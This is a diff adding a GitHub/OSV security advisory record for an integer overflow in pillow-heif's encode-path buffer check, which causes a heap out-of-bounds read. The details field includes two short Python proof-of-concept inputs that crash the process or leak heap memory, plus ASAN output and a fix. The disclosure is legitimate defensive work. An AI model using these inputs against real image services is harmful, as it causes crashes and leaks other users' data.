@@ -1,0 +1,165 @@
+{
+  "id": "GHSA-5gjj-6r7v-ph3x",
+  "modified": "2026-07-20T19:15:27.655329502Z",
+  "published": "2026-07-20T19:08:04Z",
+  "aliases": [
+    "CVE-2026-28231",
+    "PYSEC-2026-2248",
+    "PYSEC-2026-2258"
+  ],
+  "summary": "pillow-heif: Integer Overflow in Encode Path Buffer Validation Leads to Heap Out-of-Bounds Read",
+  "details": "### Summary\n\nAn integer overflow in the encode path buffer validation of `_pillow_heif.c` allows an attacker to bypass bounds checks by providing large image dimensions, resulting in a heap out-of-bounds read. This can lead to information disclosure (server heap memory leaking into encoded images) or denial of service (process crash). No special configuration is required — this triggers under default settings.\n\n### Details\n\nThe buffer validation in `_CtxWriteImage_add_plane()`, `_CtxWriteImage_add_plane_la()`, and `_CtxWriteImage_add_plane_l()` uses 32-bit `int` multiplication to check whether the input buffer is large enough:\n\n```c\n// _pillow_heif.c, lines 158, 344, 449\nif (stride_in * height \u003e buffer.len) {\n    PyBuffer_Release(\u0026buffer);\n    PyErr_SetString(PyExc_ValueError, \"image plane does not contain enough data\");\n    return NULL;\n}\n```\n\nBoth `stride_in` and `height` are declared as `int` (32-bit signed). When their product exceeds `INT_MAX` (2,147,483,647), the multiplication overflows before the comparison with `buffer.len` (which is `Py_ssize_t`, 64-bit). The overflowed value wraps to zero or a negative number, causing the bounds check to pass incorrectly.\n\nFor example, with `stride_in = 196608` (65536 × 3 for RGB) and `height = 65536`:\n- True product: 12,884,901,888\n- `int32` product: 0 (wraps around)\n- Comparison: `0 \u003e buffer.len` → `false` → check bypassed\n\nAfter the check is bypassed, the subsequent loop reads beyond the input buffer:\n\n```c\nfor (int i = 0; i \u003c height; i++)\n    memcpy(out + stride_out * i, in + stride_in * i, real_stride);\n```\n\nAdditionally, `real_stride = width * n_channels` (e.g., line 148: `real_stride = width * 3`) is also computed as `int * int`, which can independently overflow for large `width` values.\n\nThis vulnerability exists in the **encode path**, which is distinct from the decode path:\n- The decode path is partially guarded by libheif's built-in security limits\n- The encode path has **no such guards** — `DISABLE_SECURITY_LIMITS` is irrelevant\n- The encode path is reachable whenever an application calls `pillow_heif.encode()` or saves an image via Pillow with `format=\"HEIF\"` / `format=\"AVIF\"`\n\n**Affected functions** (all in `_pillow_heif.c`):\n- `_CtxWriteImage_add_plane()` — line 158\n- `_CtxWriteImage_add_plane_la()` — line 344\n- `_CtxWriteImage_add_plane_l()` — line 449\n\n**CWE**: CWE-190 (Integer Overflow or Wraparound) → CWE-125 (Out-of-bounds Read)\n\n### PoC\n\n#### Prerequisites\n\n```bash\npip install pillow-heif Pillow\n```\n\nFor ASAN confirmation:\n\n```bash\n# macOS (Apple Clang)\nCC=\"cc -fsanitize=address -fno-omit-frame-pointer -g\" pip install --no-binary pillow-heif pillow-heif\n\n# Linux (GCC)\nCC=\"gcc -fsanitize=address -fno-omit-frame-pointer -g\" pip install --no-binary pillow-heif pillow-heif\n```\n\n#### Test 1: Crash without ASAN (process killed by SIGSEGV/SIGBUS)\n\n```python\nimport pillow_heif\nfrom io import BytesIO\n\n# width=32768, height=32768 =\u003e 1,073,741,824 pixels (within libheif security limit)\n# stride_in = 32768 * 3 = 98304\n# 98304 * 32768 = 3,221,225,472 \u003e INT_MAX (2,147,483,647)\n# int32 overflow: wraps to -1,073,741,824\n# Bounds check: -1,073,741,824 \u003e 1,048,576 → False → BYPASSED\nwidth = 32768\nheight = 32768\nbuffer = b\"\\x00\" * (1024 * 1024)  # 1 MB (real need: ~3 GB)\n\nbuf = BytesIO()\ntry:\n    pillow_heif.encode(\"RGB\", (width, height), buffer, buf, quality=-1)\n    print(\"[!] encode() succeeded — bounds check was bypassed\")\nexcept MemoryError as e:\n    print(f\"[*] MemoryError (libheif caught it later): {e}\")\n    print(\"[*] int32 overflow occurred — C-level bounds check was bypassed\")\nexcept ValueError as e:\n    print(f\"[-] ValueError (bounds check worked): {e}\")\n```\n\nWithout ASAN, this crashes the process with **exit code 138 (SIGBUS)** or **139 (SIGSEGV)**.\n\n#### Test 2: Explicit stride — small image, immediate crash\n\n```python\nimport pillow_heif\nfrom io import BytesIO\n\n# 100x100 pixels — well within any security limit\n# stride=INT_MAX (2,147,483,647), height=100\n# INT_MAX * 100 overflows int32 → small or negative value\n# Bounds check bypassed, memcpy reads far beyond the 256-byte buffer\nwidth = 100\nheight = 100\nstride_val = 2_147_483_647\nsmall_buffer = b\"\\x00\" * 256\n\nbuf = BytesIO()\ntry:\n    pillow_heif.encode(\"RGB\", (width, height), small_buffer, buf,\n                       quality=-1, stride=stride_val)\n    print(\"[!] encode() succeeded — bounds check was bypassed\")\nexcept ValueError as e:\n    print(f\"[-] ValueError (bounds check worked): {e}\")\n```\n\nWithout ASAN, this crashes with **exit code 139 (SIGSEGV)**.\n\n#### ASAN confirmation\n\nWith an ASAN-enabled build of pillow-heif 1.2.1 on macOS (Apple Clang 17, arm64, Python 3.14), Test 1 produces:\n\n```\n==60070==ERROR: AddressSanitizer: negative-size-param: (size=-1073741824)\n    #0 0x... in \u003cdeduplicated_symbol\u003e (libclang_rt.asan_osx_dynamic.dylib)\n    #1 0x... in __asan_memcpy (libclang_rt.asan_osx_dynamic.dylib)\n    #2 0x... in _CtxWriteImage_add_plane+0x5bc (_pillow_heif.cpython-314-darwin.so)\n    #3 0x... in method_vectorcall_VARARGS (libpython3.14.dylib)\n    ...\n\n0x... is located 32 bytes inside of 1048609-byte region [0x...,0x...)\nallocated by thread T0 here:\n    #0 0x... in malloc (libclang_rt.asan_osx_dynamic.dylib)\n    ...\n\nSUMMARY: AddressSanitizer: negative-size-param\n  (_pillow_heif.cpython-314-darwin.so) in _CtxWriteImage_add_plane+0x5bc\n```\n\nThe overflow in `stride_in * height` (98304 × 32768 = 3,221,225,472) wraps to `-1,073,741,824` in 32-bit signed arithmetic. This negative value bypasses the bounds check and is passed directly to `memcpy` as the size parameter, causing an out-of-bounds read from the 1 MB input buffer.\n\n### Impact\n\n**Who is impacted**: Any application that uses pillow-heif to encode images where the dimensions (width, height) can be influenced by external input. Common scenarios include:\n\n- Image resize/conversion web APIs (e.g., thumbnail generation, format conversion endpoints)\n- Content management systems that convert uploaded images to HEIF/AVIF\n- Image processing pipelines that accept user-specified output dimensions\n\n**Information Disclosure (Heartbleed-like)**: The out-of-bounds read copies heap memory adjacent to the input buffer into the output image. If the encoded image is returned to the requester, it may contain fragments of:\n- Other users' request data\n- Python objects (strings, byte arrays)\n- Session tokens, API keys, or other sensitive data from the server's heap\n\n**Denial of Service**: When `memcpy` reaches unmapped memory pages, the process crashes with SIGSEGV. Repeated exploitation can take down all worker processes (gunicorn, uvicorn, etc.).\n\n**Suggested fix**: Cast operands to `Py_ssize_t` before multiplication at all three locations:\n\n```c\n// Before (vulnerable):\nif (stride_in * height \u003e buffer.len) {\n\n// After (fixed):\nif ((Py_ssize_t)stride_in * (Py_ssize_t)height \u003e buffer.len) {\n```\n\n**Prior art**:\n- CVE-2024-5197 (libvpx): integer overflow in `vpx_img_alloc()`, CVSS 7.5\n- CVE-2024-5171 (libaom): integer overflow in `aom_img_alloc()`, CVSS 9.8",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pi-heif",
+        "purl": "pkg:pypi/pi-heif"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.10.0",
+        "0.10.1",
+        "0.11.0",
+        "0.11.1",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.20.0",
+        "0.21.0",
+        "0.22.0",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.8.0",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.3",
+        "1.0.0",
+        "1.1.0",
+        "1.1.1",
+        "1.2.0",
+        "1.2.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-5gjj-6r7v-ph3x/GHSA-5gjj-6r7v-ph3x.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow-heif",
+        "purl": "pkg:pypi/pillow-heif"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.10",
+        "0.1.11",
+        "0.1.4",
+        "0.1.5",
+        "0.10.0",
+        "0.10.1",
+        "0.11.1",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.15.0",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.2.2",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.20.0",
+        "0.21.0",
+        "0.22.0",
+        "0.3.0",
+        "0.3.1",
+        "0.3.2",
+        "0.4.0",
+        "0.5.0",
+        "0.5.1",
+        "0.6.0",
+        "0.6.1",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.8.0",
+        "0.9.0",
+        "0.9.1",
+        "0.9.2",
+        "0.9.3",
+        "1.0.0",
+        "1.1.0",
+        "1.1.1",
+        "1.2.0",
+        "1.2.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-5gjj-6r7v-ph3x/GHSA-5gjj-6r7v-ph3x.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/bigcat88/pillow_heif/security/advisories/GHSA-5gjj-6r7v-ph3x"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28231"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/bigcat88/pillow_heif/commit/8305a15d3780c533b762578cbe987d27a2c59c7a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/bigcat88/pillow_heif"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/bigcat88/pillow_heif/releases/tag/v1.3.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pi-heif/PYSEC-2026-2248.yaml"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pillow-heif/PYSEC-2026-2258.yaml"
+    }
+  ]
+}
